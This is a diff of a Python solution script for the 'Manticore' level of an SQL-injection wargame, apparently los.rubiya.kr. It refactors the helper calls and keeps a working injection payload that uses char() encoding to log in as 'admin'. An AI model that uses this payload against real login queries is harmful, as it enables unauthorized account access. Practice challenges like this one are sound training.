@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def main():
-    '''
+    """
     Manticore 38
 
     $db = sqlite_open("./db/manticore.db");
@@ -14,19 +15,20 @@ def main():
     $result = sqlite_fetch_array(sqlite_query($db,$query));
     if($result['id'] == "admin") solve("manticore");
     highlight_file(__FILE__);
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/manticore_f88f07d899ad0fc8738fe3aaacff9974.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'id'
 
-    param = dict(id="' or id=char(97,100,109,105,110)-- ")
+    payload = "' or id=char(97,100,109,105,110)-- "
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
 
-    response = los.get_request(url, param, cook)
-
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Manticore Clear!')
+        print('\nManticore Clear!')
 
 
 if __name__ == '__main__':
     main()
-
